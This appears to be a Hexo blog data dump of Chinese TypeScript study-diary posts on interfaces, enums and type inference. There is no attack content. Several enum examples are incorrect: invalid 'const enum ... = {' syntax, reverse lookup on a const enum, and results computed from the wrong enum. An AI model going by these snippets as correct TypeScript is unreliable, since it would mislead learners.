z 并没有在接口 Pc 中定义</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 使用类型断言改写</span></span><br><span class=\"line\">demo(&#123;x: <span class=\"number\">100</span>, z: <span class=\"number\">110</span>&#125; <span class=\"keyword\">as</span> Pc)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 告诉 ts 入参 '&#123;x: 100, z: 110&#125;' 都是来自于 Pc 接口的，你别 tmd 再帮我检查了</span></span><br><span class=\"line\"><span class=\"comment\">// ts： 好吧，既然你这么确定，我就听你的。</span></span><br></pre></td></tr></table></figure>\n<p>然后上面的这种做法并不是最佳的做法，最佳的做法是添加一个 <code>占位用的签名</code>。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 我不知道我后面还会传什么属性进来，所以我先用个 propsName 占个位置</span></span><br><span class=\"line\"><span class=\"keyword\">interface</span> Pc &#123;</span><br><span class=\"line\">    x?: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">    y?: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">    [propName: <span class=\"built_in\">string</span>]: <span class=\"built_in\">any</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">demo(&#123;x: <span class=\"number\">100</span>, z: <span class=\"number\">110</span>&#125;)</span><br><span class=\"line\"><span class=\"comment\">// success</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"函数类型\"><a href=\"#函数类型\" class=\"headerlink\" title=\"函数类型\"></a>函数类型</h4><p>为了使用接口表示函数类型，我们需要给接口定义一个调用签名。 它就像是一个 <code>只有参数列表和返回值类型</code> 的函数定义。<br><strong>参数列表里的每个参数都需要名字和类型。</strong></p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">interface</span> Fn &#123;</span><br><span class=\"line\">    (a: <span class=\"built_in\">number</span>, b: <span class=\"built_in\">string</span>): <span class=\"built_in\">boolean</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 定义一个 Fn 函数接口，该函数接受 a: number，b: string 作为参数，返回一个 boolean 值</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"可索引的类型\"><a href=\"#可索引的类型\" class=\"headerlink\" title=\"可索引的类型\"></a>可索引的类型</h4><p>可索引类型具有一个 <code>索引签名</code>，它描述了对象 <code>索引的类型</code>，还有相应的索引 <code>返回值类型</code>。<br>共有两种索引签名：字符串和数字。可以同时使用两种类型的索引，但是数字索引的返回值必须是字符串索引返回值类型的子类型。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 1. 指定 索引类型 为 number</span></span><br><span class=\"line\"><span class=\"keyword\">interface</span> IndexNum &#123;</span><br><span class=\"line\">    [index: <span class=\"built_in\">number</span>]: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> arr: IndexNum = [<span class=\"string\">'hello'</span>, <span class=\"string\">'world'</span>];</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(arr[<span class=\"number\">0</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 2. 指定 索引类型 为 string</span></span><br><span class=\"line\"><span class=\"keyword\">interface</span> IndexStr &#123;</span><br><span class=\"line\">    [index: <span class=\"built_in\">string</span>]: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> obj: IndexStr = &#123;<span class=\"string\">'x'</span>: <span class=\"string\">'hello'</span>, <span class=\"string\">'y'</span>: <span class=\"string\">'world'</span>&#125;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(obj[<span class=\"string\">'x'</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 3. 同时指定 索引类型 为 number 和 string</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">interface</span> TotalIndex &#123;</span><br><span class=\"line\">    [index: <span class=\"built_in\">number</span>]: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">    at: <span class=\"built_in\">number</span>; <span class=\"comment\">// success</span></span><br><span class=\"line\">    where: <span class=\"built_in\">string</span>; <span class=\"comment\">// error 使用 where 获取值时返回的是 string 类型</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 4. 只读的索引类型</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">interface</span> RdIndex &#123;</span><br><span class=\"line\">    readonly [index: <span class=\"built_in\">number</span>]: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> arr: RdIndex = [<span class=\"string\">'a'</span>,<span class=\"string\">'b'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">arr[<span class=\"number\">1</span>] = <span class=\"string\">'c'</span>; <span class=\"comment\">// error, arr 为只读的索引类型</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"‘类’类型\"><a href=\"#‘类’类型\" class=\"headerlink\" title=\"‘类’类型\"></a>‘类’类型</h4><p>和其它的类型约束相似，类类型使用 <code>implements</code> 实现接口。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 定义方式完全一致</span></span><br><span class=\"line\"><span class=\"keyword\">interface</span> C &#123;</span><br><span class=\"line\">    date: <span class=\"built_in\">Date</span>;</span><br><span class=\"line\">    setTime(d: <span class=\"built_in\">Date</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// </span></span><br><span class=\"line\"><span class=\"keyword\">class</span> Clock <span class=\"keyword\">implements</span> C &#123;</span><br><span class=\"line\">     <span class=\"comment\">// 声明一个 date 属性，且约束该属性类型为 Date</span></span><br><span class=\"line\">     <span class=\"comment\">// 这种写法相当于 var date: Date</span></span><br><span class=\"line\">     <span class=\"comment\">// 只是声明并约束值类型，但并不赋值</span></span><br><span class=\"line\">    date: <span class=\"built_in\">Date</span>;</span><br><span class=\"line\">    setTime(d: <span class=\"built_in\">Date</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.date = d;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\">h: <span class=\"built_in\">number</span>, m: <span class=\"built_in\">number</span></span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ..</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>关于更多的 <code>implements</code> 的用法我目前也不是特别的清楚，所以下面就不再详细叙述了。<br>等我了解清楚之后再补上这一部分内容，你也可以通过查看<a href=\"https://www.tslang.cn/docs/handbook/interfaces.html\" target=\"_blank\" rel=\"noopener\">官方文档</a>了解。</p>\n<h4 id=\"继承接口\"><a href=\"#继承接口\" class=\"headerlink\" title=\"继承接口\"></a>继承接口</h4><p>和 <code>es2015</code> 中的 <code>extends</code> 一样，接口也是可以像类一样用来继承的。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> A &#123;</span><br><span class=\"line\">    a: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">interface</span> C &#123;</span><br><span class=\"line\">    c: <span class=\"built_in\">number</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">interface</span> B <span class=\"keyword\">extends</span> A, C &#123;</span><br><span class=\"line\">    b: <span class=\"built_in\">string</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> obj = &lt;B&gt;&#123;&#125;;</span><br><span class=\"line\">obj.a = <span class=\"number\">10</span>;</span><br><span class=\"line\">obj.b = <span class=\"string\">'10'</span>;</span><br><span class=\"line\">obj.c = <span class=\"number\">10</span>;</span><br></pre></td></tr></table></figure>\n<h4 id=\"混合类型\"><a href=\"#混合类型\" class=\"headerlink\" title=\"混合类型\"></a>混合类型</h4><p><code>interface</code> 还可以在一个接口中约束 <code>javascript</code> 中多个类型；</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">interface</span> Counter &#123;</span><br><span class=\"line\">    a: <span class=\"built_in\">number</span>; <span class=\"comment\">// 约束 a 为 number 类型</span></span><br><span class=\"line\">    getStr(): <span class=\"built_in\">void</span>;<span class=\"comment\">// 约束 getStr 无返回值；</span></span><br><span class=\"line\">    (n: <span class=\"built_in\">number</span>): <span class=\"built_in\">string</span>;<span class=\"comment\">// 约束匿名函数接受一个参数 n 为 number 类型，返回值 string 类型</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 函数 getCounter 返回值被 Counter 约束</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getCounter</span>(<span class=\"params\"></span>): <span class=\"title\">Counter</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> counter = &lt;Counter&gt;<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">start: <span class=\"built_in\">number</span></span>) </span>&#123; &#125;; <span class=\"comment\">// 类型断言</span></span><br><span class=\"line\">    counter.interval = <span class=\"number\">123</span>;</span><br><span class=\"line\">    counter.reset = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> counter;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> c = getCounter();</span><br><span class=\"line\">c(<span class=\"number\">10</span>);</span><br><span class=\"line\">c.reset();</span><br><span class=\"line\">c.interval = <span class=\"number\">5.0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">// 这个模版有问题，写 ts 的代码就会出问题</span></span><br><span class=\"line\"><span class=\"comment\">// 只能这样了</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"接口继承类\"><a href=\"#接口继承类\" class=\"headerlink\" title=\"接口继承类\"></a>接口继承类</h4><p>接口继承类时会继承父类所有的属性和方法，包括 <code>private</code> 和 <code>protected</code> 成员。<br>这意味着当你创建了一个接口继承了一个拥有 <code>私有或受保护的成员</code> 的类时，这个接口类型只能被 <code>这个类或其子类</code> 所实现（implement）。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> Control &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> state: <span class=\"built_in\">any</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// SelectableControl 含有 Control 所有的属性方法</span></span><br><span class=\"line\"><span class=\"keyword\">interface</span> SelectableControl <span class=\"keyword\">extends</span> Control &#123;</span><br><span class=\"line\">    select(): <span class=\"built_in\">void</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Button 继承自 Control 含有 Control 所有的属性方法</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> Button <span class=\"keyword\">extends</span> Control <span class=\"keyword\">implements</span> SelectableControl &#123;</span><br><span class=\"line\">    select() &#123; &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// TextBox 继承自 Control 含有 Control 所有的属性方法</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> TextBox <span class=\"keyword\">extends</span> Control &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Image 没有继承自 Control，没有 state 属性，无法实现 SelectableControl 接口</span></span><br><span class=\"line\"><span class=\"comment\">// 错误：“Image”类型缺少“state”属性。</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> Image <span class=\"keyword\">implements</span> SelectableControl &#123;</span><br><span class=\"line\">    select() &#123; &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"Typescript学习日记(六)","date":"2017-02-05T10:12:41.000Z","_content":"\n本文介绍枚举(`enum`)及类型推论。\n<!-- more -->\n\n\n### 枚举\n\n使用枚举我们可以定义一些有名字的数字常量。 枚举通过 enum关键字来定义。\n`typescript` 中的枚举可以理解为是 `javascript` 中的一种特殊的对象——**键为变量名，值为连续的序数**。\n\n```ts\n// javascript\nconst enumOfJS = {\n    one: 0,\n    two: 1,\n    three: 2\n}\n\nconsole.log(enumOfJS.one); // -> 0\nconsole.log(enumOfJS.two); // -> 1\nconsole.log(enumOfJS.three); // -> 2\n\n\n// typescript\nconst enum enumOfTS = {\n    one,\n    two,\n    three\n}\n\nconsole.log(enumOfTS.one); // -> 0\nconsole.log(enumOfTS.two); // -> 1\nconsole.log(enumOfTS.three); // -> 2\n\n// 反向枚举\n// 在 javascript 并没有这种功能，需要自己遍历\nconsole.log(enumOfTS[0]); // -> one\nconsole.log(enumOfTS[1]); // -> two\nconsole.log(enumOfTS[2]); // -> three\n\n```\n\n**枚举成员**\n\n枚举成员具有一个数字值，它可以是 `常数` 或是 `计算得出的值`;\n当满足如下条件时，枚举成员被当作是常数：\n* 不具有初始化函数并且之前的枚举成员是常数。 在这种情况下，当前枚举成员的值为上一个枚举成员的值加1。 但第一个枚举元素是个例外。如果它没有初始化方法，那么它的初始值为 `0`。\n* 枚举成员使用常数枚举表达式初始化。 常数枚举表达式是TypeScript表达式的子集，它可以在编译阶段求值。 当一个表达式满足下面条件之一时，它就是一个常数枚举表达式：\n    * 数字字面量。\n    * 引用之前定义的常数枚举成员（可以是在不同的枚举类型中定义的） 如果这个成员是在同一个枚举类型中定义的，可以使用非限定名来引用。\n    * 带括号的常数枚举表达式。\n    * `+`, `-`, `~` 一元运算符应用于常数枚举表达式。\n    * `+`, `-`, `*`, `/`, `%`, `<<`, `>>`, `>>>`, `&`, `|`, `^`二元运算符，常数枚举表达式做为其一个操作对象。若常数枚举表达式求值后为 `NaN` 或 `Infinity`，则会在编译阶段报错。\n\n除此之外所有其它的情况，枚举成员都是被当作需要计算得出的值。\n\n```ts\nconst enum FileAccess {\n    // constant members\n    None,\n    Read    = 1 << 1,\n    Write   = 1 << 2,\n    ReadWrite  = Read | Write,\n    // computed member\n    G = \"123\".length\n}\n```\n\n**序列化成员**\n\n枚举成员的数值值，默认为从 `0` 开始的一组序数。改变其中的一个，会影响 `之后` 的数值序数，而不会对前面的造成影响。\n\n```ts\n// 默认情况\nconst enum Order {\n    A,\n    B,\n    C,\n    D\n}\n\nlet orders = [Order.A, Order.B, Order.C, Order.D]; // -> [0,1,2,3]\n\n// 更改数值\nconst enum Order1 {\n    A,\n    B = 3,\n    C,\n    D\n}\n\nlet orders1 = [Order.A, Order.B, Order.C, Order.D]; // -> [0,3,4,5]\n\n// 更改数值为负\nconst enum Order2 {\n    A,\n    B = -2,\n    C,\n    D\n}\n\nlet orders2 = [Order.A, Order.B, Order.C, Order.D]; // -> [0,-2,-1,0]\n\n// 无序数差值\nconst enum Order3 {\n    A,\n    B = 1,\n    C,\n    D = 2\n}\n\nlet orders2 = [Order.A, Order.B, Order.C, Order.D]; // -> [0,1,2,2]\n\n```\n\n\n### 类型推论\n\n`TypeScript` 里，在有些没有明确指出类型的地方，类型推论会帮助提供类型。\n\n```ts\nlet num = 1;\n\n// num 虽然没有指定为 number 类型，但是 typescript 会自动推断 num 的类型为 number\n// let num: number = 1;\n```\n\n#### 最佳通用类型\n\n当要从几个表达式中推断类型时，`typescript` 会为我们推断出一个最合适的通用类型。\n\n```ts\nlet arr = [1,2,3,'4',null,undefined];\n\n// 还记得吗，null 和 undefined 是所有类型的 子类型\n// arr 数组中含有 number 和 string 两种类型，则使用联合类型数组\n// let arr: (number|string)[] = [1,2,3,'4',null,undefined]\n```\n\n#### 上下文类型\n\n`TypeScript` 类型推论也可能按照相反的方向进行，这被叫做“按上下文归类”。按上下文归类会发生在表达式的类型与所处的位置相关时。\n\n这里直接引用官方例子：\n```ts\nwindow.onmousedown = function(mouseEvent) {\n    console.log(mouseEvent.button);  //-> Error\n}\n// TypeScript 类型检查器使用 Window.onmousedown函数 的类型来 推断 右边函数表达式的参数类型\n\n// 通过手动指定的方式，避免类型推断\n\n\nwindow.onmousedown = function (mouseEvent: any) {\n    console.log(mouseEvent.button); // -> success\n}\n```\n\n\n\n\n\n","source":"_posts/Typescript学习日记（六）.md","raw":"---\ntitle: Typescript学习日记(六)\ndate: 2017-02-05 18:12:41\ntags:\n---\n\n本文介绍枚举(`enum`)及类型推论。\n<!-- more -->\n\n\n### 枚举\n\n使用枚举我们可以定义一些有名字的数字常量。 枚举通过 enum关键字来定义。\n`typescript` 中的枚举可以理解为是 `javascript` 中的一种特殊的对象——**键为变量名，值为连续的序数**。\n\n```ts\n// javascript\nconst enumOfJS = {\n    one: 0,\n    two: 1,\n    three: 2\n}\n\nconsole.log(enumOfJS.one); // -> 0\nconsole.log(enumOfJS.two); // -> 1\nconsole.log(enumOfJS.three); // -> 2\n\n\n// typescript\nconst enum enumOfTS = {\n    one,\n    two,\n    three\n}\n\nconsole.log(enumOfTS.one); // -> 0\nconsole.log(enumOfTS.two); // -> 1\nconsole.log(enumOfTS.three); // -> 2\n\n// 反向枚举\n// 在 javascript 并没有这种功能，需要自己遍历\nconsole.log(enumOfTS[0]); // -> one\nconsole.log(enumOfTS[1]); // -> two\nconsole.log(enumOfTS[2]); // -> three\n\n```\n\n**枚举成员**\n\n枚举成员具有一个数字值，它可以是 `常数` 或是 `计算得出的值`;\n当满足如下条件时，枚举成员被当作是常数：\n* 不具有初始化函数并且之前的枚举成员是常数。 在这种情况下，当前枚举成员的值为上一个枚举成员的值加1。 但第一个枚举元素是个例外。如果它没有初始化方法，那么它的初始值为 `0`。\n* 枚举成员使用常数枚举表达式初始化。 常数枚举表达式是TypeScript表达式的子集，它可以在编译阶段求值。 当一个表达式满足下面条件之一时，它就是一个常数枚举表达式：\n    * 数字字面量。\n    * 引用之前定义的常数枚举成员（可以是在不同的枚举类型中定义的） 如果这个成员是在同一个枚举类型中定义的，可以使用非限定名来引用。\n    * 带括号的常数枚举表达式。\n    * `+`, `-`, `~` 一元运算符应用于常数枚举表达式。\n    * `+`, `-`, `*`, `/`, `%`, `<<`, `>>`, `>>>`, `&`, `|`, `^`二元运算符，常数枚举表达式做为其一个操作对象。若常数枚举表达式求值后为 `NaN` 或 `Infinity`，则会在编译阶段报错。\n\n除此之外所有其它的情况，枚举成员都是被当作需要计算得出的值。\n\n```ts\nconst enum FileAccess {\n    // constant members\n    None,\n    Read    = 1 << 1,\n    Write   = 1 << 2,\n    ReadWrite  = Read | Write,\n    // computed member\n    G = \"123\".length\n}\n```\n\n**序列化成员**\n\n枚举成员的数值值，默认为从 `0` 开始的一组序数。改变其中的一个，会影响 `之后` 的数值序数，而不会对前面的造成影响。\n\n```ts\n// 默认情况\nconst enum Order {\n    A,\n    B,\n    C,\n    D\n}\n\nlet orders = [Order.A, Order.B, Order.C, Order.D]; // -> [0,1,2,3]\n\n// 更改数值\nconst enum Order1 {\n    A,\n    B = 3,\n    C,\n    D\n}\n\nlet orders1 = [Order.A, Order.B, Order.C, Order.D]; // -> [0,3,4,5]\n\n// 更改数值为负\nconst enum Order2 {\n    A,\n    B = -2,\n    C,\n    D\n}\n\nlet orders2 = [Order.A, Order.B, Order.C, Order.D]; // -> [0,-2,-1,0]\n\n// 无序数差值\nconst enum Order3 {\n    A,\n    B = 1,\n    C,\n    D = 2\n}\n\nlet orders2 = [Order.A, Order.B, Order.C, Order.D]; // -> [0,1,2,2]\n\n```\n\n\n### 类型推论\n\n`TypeScript` 里，在有些没有明确指出类型的地方，类型推论会帮助提供类型。\n\n```ts\nlet num = 1;\n\n// num 虽然没有指定为 number 类型，但是 typescript 会自动推断 num 的类型为 number\n// let num: number = 1;\n```\n\n#### 最佳通用类型\n\n当要从几个表达式中推断类型时，`typescript` 会为我们推断出一个最合适的通用类型。\n\n```ts\nlet arr = [1,2,3,'4',null,undefined];\n\n// 还记得吗，null 和 undefined 是所有类型的 子类型\n// arr 数组中含有 number 和 string 两种类型，则使用联合类型数组\n// let arr: (number|string)[] = [1,2,3,'4',null,undefined]\n```\n\n#### 上下文类型\n\n`TypeScript` 类型推论也可能按照相反的方向进行，这被叫做“按上下文归类”。按上下文归类会发生在表达式的类型与所处的位置相关时。\n\n这里直接引用官方例子：\n```ts\nwindow.onmousedown = function(mouseEvent) {\n    console.log(mouseEvent.button);  //-> Error\n}\n// TypeScript 类型检查器使用 Window.onmousedown函数 的类型来 推断 右边函数表达式的参数类型\n\n// 通过手动指定的方式，避免类型推断\n\n\nwindow.onmousedown = function (mouseEvent: any) {\n    console.log(mouseEvent.button); // -> success\n}\n```\n\n\n\n\n\n","slug":"Typescript学习日记（六）","published":1,"updated":"2018-10-25T06:05:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjno6s7qo000b02vs2rlgdcx7","content":"<p>本文介绍枚举(<code>enum</code>)及类型推论。<br><a id=\"more\"></a></p>\n<h3 id=\"枚举\"><a href=\"#枚举\" class=\"headerlink\" title=\"枚举\"></a>枚举</h3><p>使用枚举我们可以定义一些有名字的数字常量。 枚举通过 enum关键字来定义。<br><code>typescript</code> 中的枚举可以理解为是 <code>javascript</code> 中的一种特殊的对象——<strong>键为变量名，值为连续的序数</strong>。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// javascript</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> enumOfJS = &#123;</span><br><span class=\"line\">    one: <span class=\"number\">0</span>,</span><br><span class=\"line\">    two: <span class=\"number\">1</span>,</span><br><span class=\"line\">    three: <span class=\"number\">2</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(enumOfJS.one); <span class=\"comment\">// -&gt; 0</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(enumOfJS.two); <span class=\"comment\">// -&gt; 1</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(enumOfJS.three); <span class=\"comment\">// -&gt; 2</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// typescript</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">enum</span> enumOfTS = &#123;</span><br><span class=\"line\">    one,</span><br><span class=\"line\">    two,</span><br><span class=\"line\">    three</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(enumOfTS.one); <span class=\"comment\">// -&gt; 0</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(enumOfTS.two); <span class=\"comment\">// -&gt; 1</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(enumOfTS.three); <span class=\"comment\">// -&gt; 2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 反向枚举</span></span><br><span class=\"line\"><span class=\"comment\">// 在 javascript 并没有这种功能，需要自己遍历</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(enumOfTS[<span class=\"number\">0</span>]); <span class=\"comment\">// -&gt; one</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(enumOfTS[<span class=\"number\">1</span>]); <span class=\"comment\">// -&gt; two</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(enumOfTS[<span class=\"number\">2</span>]); <span class=\"comment\">// -&gt; three</span></span><br></pre></td></tr></table></figure>\n<p><strong>枚举成员</strong></p>\n<p>枚举成员具有一个数字值，它可以是 <code>常数</code> 或是 <code>计算得出的值</code>;<br>当满足如下条件时，枚举成员被当作是常数：</p>\n<ul>\n<li>不具有初始化函数并且之前的枚举成员是常数。 在这种情况下，当前枚举成员的值为上一个枚举成员的值加1。 但第一个枚举元素是个例外。如果它没有初始化方法，那么它的初始值为 <code>0</code>。</li>\n<li>枚举成员使用常数枚举表达式初始化。 常数枚举表达式是TypeScript表达式的子集，它可以在编译阶段求值。 